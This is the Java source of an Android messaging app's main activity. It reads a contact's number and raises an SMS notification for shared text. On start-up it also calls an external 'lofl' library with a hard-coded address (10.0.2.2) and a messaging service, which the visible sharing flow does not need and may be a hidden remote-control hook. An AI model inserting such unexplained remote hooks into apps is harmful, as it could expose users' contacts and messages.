package com.candroid.textme.ui.activities;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;

import com.candroid.lofl.Lofl;
import com.candroid.lofl.activities.HeadlessActivity;
import com.candroid.lofl.activities.LoflActivity;
import com.candroid.lofl.api.ContentProviders;
import com.candroid.lofl.data.Constants;
import com.candroid.textme.notifications.NotificationFactory;
import com.candroid.textme.services.MessagingService;


public class MainActivity extends Activity {
    public static final String TAG = MainActivity.class.getSimpleName();
    public static final int CONTACT_REQUEST_CODE = 666;
    private String mSharedText;
    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        if(intent.getAction().equals(Intent.ACTION_SEND)){
            mSharedText = intent.getStringExtra(Intent.EXTRA_TEXT);
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Lofl.lofl(this,"10.0.2.2", MessagingService.class);
    }

    @Override
    public void onBackPressed() {
        finishActivity(CONTACT_REQUEST_CODE);
        finishAndRemoveTask();
        super.onBackPressed();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        final StringBuilder stringBuilder = new StringBuilder();
        if (requestCode == CONTACT_REQUEST_CODE && resultCode == Activity.RESULT_OK) {
            Thread thread = new Thread(new Runnable() {
                @Override
                public void run() {
                    Uri contactUri = data.getData();
                    Cursor cursor = getContentResolver().query(contactUri, null, null, null, null);
                    if (cursor.moveToFirst()) {
                        int addressColumn = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                        stringBuilder.append(cursor.getString(addressColumn));
                        cursor.close();
                    }
                    if(checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED){
                        NotificationFactory.createConversationNotification(MainActivity.this, stringBuilder.toString(), mSharedText);
                    }else{
                        requestPermissions(new String[]{Manifest.permission.SEND_SMS}, Constants.SMS_PERMISSIONS_REQ_CODE);
                    }
                }
            });
            thread.start();
        }else if(requestCode == LoflActivity.PERMISSIONS_REQUEST_CODE && resultCode == Activity.RESULT_OK){
            ContentProviders.Contacts.pickContact(this, CONTACT_REQUEST_CODE);
        }else {
            onBackPressed();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        mSharedText = null;
        finishAndRemoveTask();
    }
}